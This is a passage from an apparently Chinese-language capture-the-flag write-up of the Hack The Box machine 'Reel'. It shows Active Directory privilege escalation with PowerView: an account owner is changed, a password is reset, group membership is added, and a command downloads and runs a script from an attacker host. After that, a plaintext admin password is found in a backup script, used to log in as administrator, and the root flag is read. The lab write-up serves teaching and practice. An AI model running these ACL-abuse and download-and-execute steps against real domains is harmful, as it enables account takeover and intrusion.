 Directory of C:\Users\tom\Desktop\AD Audit\BloodHound                                                                          

05/30/2018  12:44 AM    <DIR>          .                                                                                        
05/30/2018  12:44 AM    <DIR>          ..                                                                                       
05/29/2018  08:57 PM    <DIR>          Ingestors                                                                                
10/30/2017  11:15 PM           769,587 PowerView.ps1                                                                            
               1 File(s)        769,587 bytes                                                                                   
               3 Dir(s)   4,920,786,944 bytes free                                                                              

tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>powershell                                                                    
Windows PowerShell                                                                                                              
Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  

PS C:\Users\tom\Desktop\AD Audit\BloodHound> . .\PowerView.ps1
```

重置 `claire` 的密码为 `P@ssw0rd!`。

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                          
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPass
word                                                                                                                            
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $pass = ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force
```

使用重置的密码登陆 `claire`，在 Kali 中准备好 `PowerView`，加载 `PowerView`。

增加 `claire` 为 `Backup_Admins` 组成员。

```bash
PS C:\apps> IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.15:8000/PowerView.ps1')
PS C:\apps> Add-DomainObjectAcl -TargetIdentity 'Backup_Admins' -PrincipalIdentity claire -Rights WriteMembers                  
PS C:\apps>                                                                                                                     
PS C:\apps> Add-DomainGroupMember -Identity 'Backup_Admins' -Members claire                                                     
PS C:\apps> net group "Backup_Admins"                                                                                           
Group name     Backup_Admins                                                                                                    
Comment                                                                                                                         

Members                                                                                                                         

-------------------------------------------------------------------------------                                                 
claire                   ranj                                                                                                   
The command completed successfully.
```

重新登陆 `claire`，验证是否加载成功。

```bash
claire@REEL C:\Users\claire>whoami /groups | findstr /i "Backup"                                 
HTB\Backup_Admins                           Group            S-1-5-21-2648318136-3688571242-2924127574-1135 Mandatory group, Ena                                                                  
bled by default, Enabled group
```

进入 `Administrator` 尝试读取 `root.txt` 失败。

```bash
claire@REEL C:\Users\claire>cd C:\Users\Administrator\Desktop                                                                   

claire@REEL C:\Users\Administrator\Desktop>dir                                                                                  
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CEBA-B613                                                                                              

 Directory of C:\Users\Administrator\Desktop                                                                                    

01/21/2018  03:56 PM    <DIR>          .                                                                                        
01/21/2018  03:56 PM    <DIR>          ..                                                                                       
11/02/2017  10:47 PM    <DIR>          Backup Scripts                                                                           
05/30/2026  10:08 AM                34 root.txt                                                                                 
               1 File(s)             34 bytes                                                                                   
               3 Dir(s)   4,918,202,368 bytes free                                                                              

claire@REEL C:\Users\Administrator\Desktop>type root.txt                                                                        
Access is denied.
```

继续浏览发现 `administrator` 的密码为 `Cr4ckMeIfYouC4n`。

```bash
claire@REEL C:\Users\Administrator\Desktop>cd "Backup Scripts"                                                                                                                                    
                                                                                                 
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir                                    
 Volume in drive C has no label.                                                                                                                                                                  
 Volume Serial Number is CEBA-B613                                                                                                                                                                
                                                                                                 
 Directory of C:\Users\Administrator\Desktop\Backup Scripts                                      
                                                                                                 
11/02/2017  10:47 PM    <DIR>          .                                                         
11/02/2017  10:47 PM    <DIR>          ..                                                                                                                                                         
11/04/2017  12:22 AM               845 backup.ps1                                                
11/02/2017  10:37 PM               462 backup1.ps1                                                                                                                                                
11/04/2017  12:21 AM             5,642 BackupScript.ps1                                                                                                                                           
11/02/2017  10:43 PM             2,791 BackupScript.zip                                          
11/04/2017  12:22 AM             1,855 folders-system-state.txt                                  
11/04/2017  12:22 AM               308 test2.ps1.txt                                                                                                                                              
               6 File(s)         11,903 bytes                                                    
               2 Dir(s)   4,918,095,872 bytes free                                               

claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                  
# admin password                                
$password="Cr4ckMeIfYouC4n!"                    

#Variables, only Change here                    
$Destination="\\BACKUP03\BACKUP" #Copy the Files to this Location                                
$Versions="50" #How many of the last Backups you want to keep                                    
$BackupDirs="C:\Program Files\Microsoft\Exchange Server" #What Folders you want to backup        
$Log="Log.txt" #Log Name                        
$LoggingLevel="1" #LoggingLevel only for Output in Powershell Window, 1=smart, 3=Heavy           

#STOP-no changes from here                      
#STOP-no changes from here                      
#Settings - do not change anything from here    
$Backupdir=$Destination +"\Backup-"+ (Get-Date -format yyyy-MM-dd)+"-"+(Get-Random -Maximum 100000)+"\"                         
$Items=0                                        
$Count=0                                        
$ErrorCount=0                                   
$StartDate=Get-Date #-format dd.MM.yyyy-HH:mm:ss

#FUNCTION                                       
#Logging 
```

```bash
# admin password                                
$password="Cr4ckMeIfYouC4n!" 
```

使用 ssh 登陆 `administrator`。

```bash
administrator@REEL C:\Users\Administrator>whoam
i                                              
htb\administrator                              

administrator@REEL C:\Users\Administrator>cd De
sktop                                          

administrator@REEL C:\Users\Administrator\Deskt
op>type root.txt                               
ec6452cc4dd32c24e3153b30e1e46d54
```